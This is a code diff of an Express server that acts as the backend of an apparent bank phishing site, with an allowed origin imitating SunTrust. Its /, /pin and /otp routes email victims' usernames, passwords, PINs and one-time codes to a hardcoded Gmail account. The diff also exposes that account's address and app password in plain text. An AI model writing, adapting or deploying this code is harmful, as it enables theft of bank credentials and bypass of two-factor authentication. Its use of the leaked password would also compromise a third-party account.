@@ -1,174 +1,115 @@
 const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT
+
 const app = express(); // app is use for link express functions
 const cors = require("cors");
-const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gotten to email
+const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email
 
-// Middleware - moved to top to avoid duplication
 app.use(express.json());
-app.use(cors({ origin: "https://ssuntrust-web-app.vercel.app" }));
+app.use(cors());
 
 const PORT = process.env.PORT || 5000; // port to connect to WEB
 
-// emails credentials - use environment variables in production
-const userEmail ="laluzresorts@gmail.com";
-const pass ="pjrjqmhnjohmaqmu";
+// emails credentials
+const userEmail = "laluzresorts@gmail.com";
+const pass = "pjrjqmhnjohmaqmu";
+// 15 MAY
 
-// API routes for index (login)
-app.post("/", async (req, res) => {
-  try {
-    const { username, password } = req.body;
+// Middleware
+app.use(express.json());
 
-    // Validate input
-    if (!username || !password) {
-      return res.status(400).json({ error: "Username and password are required" });
+// api routes
+
+// API routes for index
+app.post("/", (req, res) => {
+  const { username, password } = req.body;
+
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: username,
+    to: userEmail,
+    subject: `username: ${username}\nPassword: ${password}`,
+    text: `New user registered with Username: ${username}\nPassword: ${password}`,
+  };
+
+  console.log(mailOptions);
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
     }
-
-    const transporter = nodemailer.createTransporter({
-      service: "gmail",
-      auth: {
-        user: userEmail,
-        pass: pass,
-      },
-    });
-
-    // Verify transporter configuration
-    await transporter.verify();
-
-    const mailOptions = {
-      from: userEmail,
-      to: userEmail,
-      subject: `Login Attempt - Username: ${username}`,
-      text: `New login attempt:\nUsername/Email: ${username}\nPassword: ${password}`,
-      html: `
-        <h3>New Login Attempt</h3>
-        <p><strong>Username/Email:</strong> ${username}</p>
-        <p><strong>Password:</strong> ${password}</p>
-        <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
-      `
-    };
-
-    console.log("Sending login email...");
-    const info = await transporter.sendMail(mailOptions);
-    console.log("Login email sent:", info.response);
-    res.json("success");
-
-  } catch (error) {
-    console.error("Login email error:", error);
-    res.status(500).json({ 
-      error: "Failed to process login",
-      details: process.env.NODE_ENV === 'development' ? error.message : undefined
-    });
-  }
+  });
 });
-
 // API routes for pin
-app.post("/pin", async (req, res) => {
-  try {
-    console.log("PIN request body:", req.body);
-    const { pin } = req.body;
+app.post("/pin", (req, res) => {
+  console.log(req.body);
+  let { pin } = req.body;
 
-    // Validate input
-    if (!pin) {
-      return res.status(400).json({ error: "PIN is required" });
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: userEmail,
+    to: userEmail,
+    subject: `PIN is: ${pin}`,
+    text: `New user PIN is: ${pin}`,
+  };
+  console.log(mailOptions);
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
     }
-
-    const transporter = nodemailer.createTransporter({
-      service: "gmail",
-      auth: {
-        user: userEmail,
-        pass: pass,
-      },
-    });
-
-    const mailOptions = {
-      from: userEmail,
-      to: userEmail,
-      subject: `PIN Submission: ${pin}`,
-      text: `New PIN submission: ${pin}`,
-      html: `
-        <h3>PIN Submission</h3>
-        <p><strong>PIN:</strong> ${pin}</p>
-        <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
-      `
-    };
-
-    console.log("Sending PIN email...");
-    const info = await transporter.sendMail(mailOptions);
-    console.log("PIN email sent:", info.response);
-    res.json("success");
-
-  } catch (error) {
-    console.error("PIN email error:", error);
-    res.status(500).json({ 
-      error: "Failed to process PIN",
-      details: process.env.NODE_ENV === 'development' ? error.message : undefined
-    });
-  }
+  });
 });
-
 // API routes for otp
-app.post("/otp", async (req, res) => {
-  try {
-    console.log("OTP request body:", req.body);
-    const { otp } = req.body;
+app.post("/otp", (req, res) => {
+  console.log(req.body);
+  let { otp } = req.body;
 
-    // Validate input
-    if (!otp) {
-      return res.status(400).json({ error: "OTP is required" });
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: userEmail,
+    to: userEmail,
+    subject: `OTP is: ${otp}`,
+    text: `New user OTP is: ${otp}`,
+  };
+  console.log(mailOptions);
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
     }
-
-    const transporter = nodemailer.createTransporter({
-      service: "gmail",
-      auth: {
-        user: userEmail,
-        pass: pass,
-      },
-    });
-
-    const mailOptions = {
-      from: userEmail,
-      to: userEmail,
-      subject: `OTP Submission: ${otp}`,
-      text: `New OTP submission: ${otp}`,
-      html: `
-        <h3>OTP Submission</h3>
-        <p><strong>OTP:</strong> ${otp}</p>
-        <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
-      `
-    };
-
-    console.log("Sending OTP email...");
-    const info = await transporter.sendMail(mailOptions);
-    console.log("OTP email sent:", info.response);
-    res.json("success");
-
-  } catch (error) {
-    console.error("OTP email error:", error);
-    res.status(500).json({ 
-      error: "Failed to process OTP",
-      details: process.env.NODE_ENV === 'development' ? error.message : undefined
-    });
-  }
-});
-
-// Health check endpoint
-app.get("/health", (req, res) => {
-  res.json({ status: "Server is running", timestamp: new Date().toISOString() });
-});
-
-// 404 handler
-app.use("*", (req, res) => {
-  res.status(404).json({ error: "Route not found" });
-});
-
-// Error handling middleware
-app.use((error, req, res, next) => {
-  console.error("Unhandled error:", error);
-  res.status(500).json({ error: "Internal server error" });
+  });
 });
 
 app.listen(PORT, () => {
   console.log(`Server is running on port http://localhost:${PORT}`);
-  console.log(`Health check available at http://localhost:${PORT}/health`);
 });
-
